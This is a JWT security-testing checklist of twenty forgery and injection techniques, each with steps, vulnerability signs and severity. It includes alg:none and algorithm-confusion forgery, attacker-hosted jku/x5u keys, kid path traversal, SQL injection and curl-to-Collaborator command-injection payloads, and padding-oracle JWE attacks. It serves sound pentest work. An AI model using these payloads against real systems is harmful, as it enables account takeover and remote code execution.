1. Test JWT for none/None/NONE algorithm bypass
Steps:

Capture any authenticated request — JWT is usually in Authorization: Bearer <token> or a cookie
Copy the token, go to jwt.io or base64-decode each part manually: base64url_decode(header), base64url_decode(payload)
In the header JSON, change "alg": "RS256" (or whatever it is) to "alg": "none"
Modify payload as desired: change "role": "user" to "role": "admin", or "sub": "2" to "sub": "1"
Re-encode header and payload (base64url, no padding), join with dot — remove the signature, keep trailing dot: newHeader.newPayload.
Also try: "alg": "None", "alg": "NONE", "alg": "nOnE" — some libs do case-sensitive check only for lowercase
Send the forged token in the request

Vulnerable When:

Server returns 200 / valid response with the modified alg: none token
Your payload changes (role/sub/email) are reflected in the response
No 401 Unauthorized — server skipped signature verification

Severity: Critical

2. Test JWT for algorithm confusion RS256 to HS256
Steps:

Find the server's RSA public key — check /jwks.json, /.well-known/openid-configuration, SSL certificate, or the app's docs
Export the public key in PEM format
Decode your existing JWT — change header "alg": "RS256" to "alg": "HS256"
Modify payload claims (e.g., "role": "admin")
Re-sign the token using the RSA public key as the HMAC-SHA256 secret: jwt.encode(payload, rsa_public_key_pem, algorithm="HS256") in Python pyjwt
Send the forged HS256 token — if server was expecting RS256 but library falls back to HMAC using public key, it verifies with its own public key (which you also know)

Vulnerable When:

Server accepts the HS256-signed token that was signed with the RSA public key
200 response returned with modified claims accepted
Library used algorithm from the token header instead of enforcing a fixed expected algorithm

Severity: Critical

3. Test JWT for JWK injection via jwk header
Steps:

Generate your own RSA 2048-bit key pair: openssl genrsa -out priv.pem 2048, openssl rsa -in priv.pem -pubout -out pub.pem
Convert your public key to JWK format (use mkjwk.org or Python jwcrypto)
Craft a JWT header with your embedded JWK: {"alg": "RS256", "jwk": {"kty":"RSA","n":"...","e":"AQAB"}}
Sign the full JWT with your private key
Send this self-signed token to the server

Vulnerable When:

Server uses the jwk parameter from the header to verify the signature (trusts embedded key)
200 returned — server verified your token using your own public key
No whitelist of allowed public keys — attacker can inject any key

Severity: Critical

4. Test JWT for JKU header pointing to attacker-controlled JWK
Steps:

Generate your own RSA key pair (same as above)
Create a JWKS file: {"keys": [<your_public_key_in_JWK_format>]} and host it at your Burp Collaborator URL or a server you control
Craft JWT header: {"alg": "RS256", "jku": "https://your-collaborator.burpcollaborator.net/jwks.json"}
Sign with your private key
Send the token — monitor Collaborator for an incoming HTTP GET to /jwks.json
If Collaborator receives the request, server fetched your JWKS and used your public key to verify

Vulnerable When:

Burp Collaborator shows an HTTP request to your JWKS URL (server fetched it)
Token is accepted (200 response) — server used your public key for verification
No domain whitelist on jku — any URL accepted

Severity: Critical

5. Test JWT for X5U header pointing to attacker certificate
Steps:

Generate a self-signed X.509 certificate: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
Host cert.pem at a URL you control (Burp Collaborator works for detection)
Add to JWT header: {"alg": "RS256", "x5u": "https://your-server.com/cert.pem"}
Sign the JWT with the matching private key (key.pem)
Send. Watch Collaborator for GET /cert.pem request from the server

Vulnerable When:

Server fetches your x5u URL (Collaborator DNS/HTTP hit confirmed)
Token accepted (200) — server used your self-signed cert for verification
No validation that cert is signed by a trusted CA or matches a pinned cert

Severity: Critical

6. Test JWT for kid parameter path traversal
Steps:

Decode JWT header — look for "kid": "keys/rsa-key-1.pem" or similar filename-like value
Change kid to "../../dev/null" — on Linux, /dev/null is an empty file = empty HMAC key
Sign the JWT with an empty string as the HMAC-SHA256 secret: jwt.encode(payload, "", algorithm="HS256")
Also try: "kid": "../../../etc/passwd" — if server reads this as signing key, you can sign with the content of /etc/passwd
Try: "kid": "/proc/self/fd/0", "kid": "../../../../dev/urandom" (predictable if seeded)

Vulnerable When:

Token signed with empty string (from /dev/null) is accepted — server verified HMAC with empty key
Path traversal confirmed: server reads arbitrary filesystem paths as signing key material
200 response with modified claims accepted

Severity: Critical

7. Test JWT for kid parameter SQL injection
Steps:

If kid looks like a database identifier: "kid": "1" or "kid": "key-prod"
Inject: "kid": "' OR '1'='1" — observe if server errors or behaves differently
If HS256: inject "kid": "' UNION SELECT 'hacked_secret'-- -" and sign the token with hacked_secret as HMAC key
The server does: SELECT key FROM signing_keys WHERE id = '<kid>' — your injection makes it return hacked_secret
If error-based: try "kid": "' AND 1=CONVERT(int, (SELECT @@version))-- -" to get DB version in error
Check response status and body for SQL errors

Vulnerable When:

SQL error visible in response (confirms injection point)
Token signed with your injected UNION-returned value is accepted (200)
You can control what signing key the server retrieves

Severity: Critical

8. Test JWT for kid parameter command injection
Steps:

If kid looks like a filename used in a shell command (e.g., "kid": "keys/key1.pem")
Try: "kid": "keys/key1.pem; curl https://your-collaborator.burpcollaborator.net" — check Collaborator for HTTP callback
Try: "kid": "|curl https://your-collaborator.burpcollaborator.net" — pipe to curl
Try: "kid": "`curl https://your-collaborator.burpcollaborator.net`" — backtick execution
Try Windows: "kid": "key1.pem & curl https://your-collaborator.burpcollaborator.net"
Monitor Collaborator for DNS/HTTP hit

Vulnerable When:

Collaborator receives DNS/HTTP request — blind RCE confirmed
Server executed your shell payload embedded in kid
Any OS command callback received = full server compromise possible

Severity: Critical (RCE)

9. Test JWT for empty signature bypass
Steps:

Take a valid JWT: header.payload.signature
Remove signature content but keep the trailing dot: header.payload.
Also try removing the last dot entirely: header.payload
Also try replacing signature with a single character: header.payload.a
Modify payload claims while doing this (change sub, role, etc.)
Send each variant and check if any returns 200

Vulnerable When:

header.payload. (empty signature) is accepted with 200
Server processes the token without validating the signature
Modified claims from the payload are honored

Severity: Critical

10. Test JWT for signature truncation attack
Steps:

Take a valid JWT with full signature
Remove last 2 characters of signature, send, record response time and status
Remove last 4 chars, send again
Remove last 8, 16, 32 chars progressively
If any truncated version returns 200, library is doing partial/length-insensitive comparison
Also test timing: valid sig should take same time as invalid sig — if different, non-constant-time comparison exists

Vulnerable When:

Truncated signature (e.g., first 10 chars of HMAC) is accepted
Response 200 returned with modified payload + partial signature
Timing difference between valid and invalid signatures (timing oracle for HMAC brute-force)

Severity: High

11. Test JWT for claim manipulation without verification
Steps:

Take any valid JWT, decode the payload
Change "role": "user" → "role": "admin" — do not change the signature at all
Re-encode the payload (base64url), put back the original signature
Token: originalHeader.modifiedPayload.originalSignature
Send — signature is now cryptographically invalid but does server check?
Also try changing "sub" to another user's ID (IDOR via JWT)

Vulnerable When:

200 returned with the original signature on a modified payload
Response content reflects modified claims ("role": "admin" reflected in response or grants admin access)
Server never actually calls signature verification function

Severity: Critical

12. Test JWT for exp claim bypass with negative values
Steps:

First confirm expiry works: take a valid JWT, wait for it to expire, resend — should get 401
If you can forge (have key or alg: none works): set "exp": -1 and send
Try "exp": 0, "exp": 1 (epoch 1970)
Try "exp": null, "exp": "never" (type confusion)
Try an extremely large number: "exp": 99999999999999 — does server accept tokens that never expire?
If no key: just resend a legitimately expired token — does server reject it at all?

Vulnerable When:

Expired token returns 200 instead of 401 (no expiry check at all)
"exp": -1 or past timestamps are accepted
"exp": 99999999999999 is accepted and token treated as never-expiring

Severity: High

13. Test JWT for nbf claim manipulation
Steps:

nbf = "not before" — token should be invalid if current time is before nbf
If you can forge: set "nbf" to a future timestamp: "nbf": 9999999999 (year 2286)
Send this "future" token — if accepted, server skips nbf check
Try "nbf": null, "nbf": "tomorrow" (type confusion attacks)
Also test: issue a token and immediately use it before nbf is reached (if any grace period exists)

Vulnerable When:

Token with nbf in the year 2286 is accepted (server ignores nbf)
Token usable before its "not before" time — allows pre-activation token abuse
Any non-numeric nbf accepted without error

Severity: Low–Medium

14. Test JWT for iat claim manipulation
Steps:

iat = issued at timestamp — used by some apps to enforce max token age (e.g., reject tokens older than 1 hour)
If you can forge: set "iat" to 1 (Unix epoch, Jan 1 1970) — token is "71 years old"
Send — if accepted, server doesn't enforce token age via iat
Set "iat" to a far future date — does it cause error or get accepted?
Try "iat": null, "iat": "yesterday" — type confusion

Vulnerable When:

Token with "iat": 1 (from 1970) accepted — no token age limit enforced
iat manipulation bypasses session invalidation (logout then use old token with older iat)
Server never uses iat for any validation purpose

Severity: Low–Medium

15. Test JWT for audience (aud) claim bypass
Steps:

Decode JWT — look for "aud": "https://api.target.com" or "aud": ["mobile-app", "web-app"]
If forgeable: change "aud" to "aud": "https://evil.com" — does server accept?
Get a token from Service A (e.g., mobile API) and send it to Service B (e.g., admin API) without modification
Try removing aud entirely — "aud": null or delete the field
Try adding your own service to array: "aud": ["https://api.target.com", "https://evil.com"]

Vulnerable When:

Token with wrong aud (evil.com) accepted by api.target.com
Token issued for mobile-API works on admin-API (cross-service token reuse)
Removing aud entirely still results in 200

Severity: High (cross-service privilege escalation)

16. Test JWT for issuer (iss) claim spoofing
Steps:

Decode JWT — look for "iss": "https://auth.target.com"
If forgeable: change to "iss": "https://evil.com" and send
Set up your own OIDC-compliant auth server that issues real valid JWTs
Get a token from your own auth server (valid signature, valid iss = your server)
Send this token to the target app — does it fetch your OIDC discovery endpoint and accept the token?
Also try: "iss": "", "iss": null, "iss": "https://target.com.evil.com"

Vulnerable When:

Token with "iss": "https://evil.com" accepted by target
Target app fetches OIDC config from attacker's server and trusts tokens signed by attacker
No iss whitelist — any issuer accepted

Severity: Critical

17. Test JWT for subject (sub) claim swapping
Steps:

Register two accounts: attacker@test.com (sub=100) and victim@test.com (sub=101)
Log in as attacker, get your JWT
Decode payload, change "sub": "100" to "sub": "101" (victim's ID) or "sub": "1" (likely admin)
If signature can't be forged, test alongside alg: none or other bypass
Send modified token to: GET /api/me, GET /api/profile, GET /api/user/orders
Check if response returns victim's data

Vulnerable When:

Response from GET /api/me shows victim's name/email/data when you use their sub
Server looks up user by sub claim without verifying the signature binds to that sub
IDOR via JWT sub manipulation

Severity: Critical

18. Test JWT for JTI claim collision and replay
Steps:

jti = JWT ID — each token should be usable only once (server should blacklist used JTIs)
Capture a valid JWT after authentication
Use it once (normal request) — gets 200
Immediately send the exact same JWT again — does it get rejected or 200 again?
Also try: save the JWT, logout (server should invalidate it), log back in, use the old JWT
Race condition test: send same JWT 50 times simultaneously using Burp Intruder with null payloads

Vulnerable When:

Second/third use of same JWT returns 200 (no JTI blacklist)
Old pre-logout JWT still works after logout (server doesn't invalidate)
Race condition: 50 concurrent requests with same JWT all return 200

Severity: Medium–High

19. Test JWT for nested JWT exploitation
Steps:

Some OIDC or complex auth flows use nested JWTs: outer JWE (encrypted) wrapping inner JWS (signed)
Decode the outer JWT — check if payload itself is another JWT (ey...)
Decode inner JWT — modify its claims ("role": "admin")
Re-wrap modified inner JWT in the outer structure (keeping outer signature intact)
If outer is validated but inner is not re-verified after decryption, modified inner claims used
Also try: set inner "alg": "none" and strip inner signature

Vulnerable When:

Server decrypts outer JWE, extracts inner JWT, but uses inner claims without verifying inner signature
Modified inner "role" or "sub" is honored in the response
Outer validation passes but inner manipulation grants privilege escalation

Severity: High

20. Test JWT for encryption algorithm downgrade (JWE)
Steps:

If app uses JWE (token has 5 parts: header.encrypted_key.iv.ciphertext.tag), decode the header
Header looks like: {"alg":"RSA-OAEP","enc":"A256GCM"} — alg = key wrap, enc = content encryption
Change "enc" to "A128CBC-HS256" (CBC mode) — CBC is vulnerable to padding oracle attacks
Change "alg" to "dir" (direct key) or "A128KW" (weaker key wrap)
If CBC mode accepted: perform a padding oracle attack on the ciphertext to decrypt it
If decrypted: read plaintext claims, modify them, re-encrypt with same weak alg, send

Vulnerable When:

Server accepts "enc": "A128CBC-HS256" downgrade from A256GCM
Padding oracle detectable: different errors for bad padding vs bad MAC
Content decrypted via padding oracle → claims readable and modifiable → re-encrypt → accepted

Severity: High–Critical